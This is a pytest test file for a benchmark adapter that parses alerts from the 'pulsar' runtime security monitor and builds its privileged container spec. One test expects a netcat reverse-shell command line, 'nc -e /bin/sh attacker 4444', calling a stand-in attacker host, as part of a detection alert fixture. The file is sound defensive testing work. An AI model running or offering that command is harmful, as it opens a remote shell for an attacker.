from __future__ import annotations

import json
import re
from pathlib import Path

import pytest

from bench.adapters.pulsar import Adapter

FIXTURES = Path(__file__).parent / "fixtures" / "pulsar"
EMITTED_AT = 1_760_000_000.0


@pytest.fixture
def adapter() -> Adapter:
    return Adapter()


def fixture_lines(name: str) -> list[str]:
    return (FIXTURES / name).read_text().splitlines()


def test_threats_parsed(adapter: Adapter) -> None:
    alerts = [adapter.parse(line, EMITTED_AT) for line in fixture_lines("alerts.jsonl")]
    assert [alert is not None for alert in alerts] == [True, True, True, False]


def test_host_threat_fields(adapter: Adapter) -> None:
    line = fixture_lines("alerts.jsonl")[0]
    alert = adapter.parse(line, EMITTED_AT)
    assert alert is not None
    assert alert.tool == "pulsar"
    assert alert.rule == "Create sensitive files symlink"
    assert alert.severity == "high"
    assert alert.emitted_at == EMITTED_AT
    assert alert.event_at == pytest.approx(1675780149.512)
    assert alert.container_id is None
    assert alert.container_name is None
    assert alert.process == "/usr/bin/ln"
    assert alert.command_line is None
    assert alert.raw == json.loads(line)


def test_container_threat_fields(adapter: Adapter) -> None:
    alert = adapter.parse(fixture_lines("alerts.jsonl")[1], EMITTED_AT)
    assert alert is not None
    assert alert.rule == "Netcat Remote Code Execution in Container"
    assert alert.severity == "medium"
    assert alert.container_id == "5d1f3b7c2a9e4f60b8d1c2e3f4a5b6c7d8e9f0a1b2c3d4e5f60718293a4b5c6d"
    assert alert.container_name == "bench-victim"
    assert alert.process == "/usr/bin/nc"
    assert alert.command_line == "nc -e /bin/sh attacker 4444"
    assert alert.event_at == pytest.approx(1758200000.25)


def test_plaintext_threats(adapter: Adapter) -> None:
    legacy, current = (adapter.parse(line, EMITTED_AT) for line in fixture_lines("plaintext.txt"))
    assert legacy is not None
    assert legacy.rule == "Create sensitive files symlink"
    assert legacy.process == "/usr/bin/ln"
    assert legacy.event_at == pytest.approx(1675780149.0)
    assert current is not None
    assert current.rule == "Netcat Remote Code Execution in Container"
    assert current.process == "/usr/bin/nc"


def test_non_alert_lines(adapter: Adapter) -> None:
    for line in fixture_lines("logs.txt"):
        assert adapter.parse(line, EMITTED_AT) is None


@pytest.mark.parametrize("profile", ["default", "tuned"])
def test_container_spec(adapter: Adapter, profile: str, tmp_path: Path) -> None:
    root = Path("/srv/bench")
    spec = adapter.container_spec(root, profile, tmp_path)
    assert spec.image == f"ebpf-bench/pulsar:{adapter.version}"
    assert spec.build_context is None
    assert spec.privileged
    assert spec.pid_mode == "host"
    profile_dir = root / "tools" / "pulsar" / profile
    mounts = {mount.target: mount for mount in spec.mounts}
    assert mounts["/etc/bench/pulsar"].source == str(profile_dir)
    assert mounts["/etc/bench/pulsar"].read_only
    assert mounts[f"/var/lib/pulsar/rules/bench-{profile}"].source == str(profile_dir / "rules")
    assert "/sys/fs/bpf" not in mounts
    for target in ("/sys/kernel/debug", "/sys/kernel/btf", "/var/lib/docker"):
        assert mounts[target].source == target
    assert mounts["/var/lib/docker"].read_only
    assert spec.command == ["--config-file", "/etc/bench/pulsar/pulsar.ini"]
    assert spec.ready_pattern is not None
    assert re.search(spec.ready_pattern, fixture_lines("logs.txt")[0])
    assert not re.search(spec.ready_pattern, fixture_lines("logs.txt")[1])


def test_no_enforce_profile(adapter: Adapter) -> None:
    assert adapter.profiles == ("default", "tuned")


def test_profiles_exist(adapter: Adapter) -> None:
    repo = Path(__file__).resolve().parents[2]
    if not (repo / "tools" / "pulsar").is_dir():
        pytest.skip("tools directory not available")
    for profile in adapter.profiles:
        assert (adapter.config_dir(repo, profile) / "pulsar.ini").is_file()
        assert (adapter.config_dir(repo, profile) / "rules").is_dir()
    assert (adapter.config_dir(repo, "tuned") / "rules" / "tuned-rules.yaml").is_file()
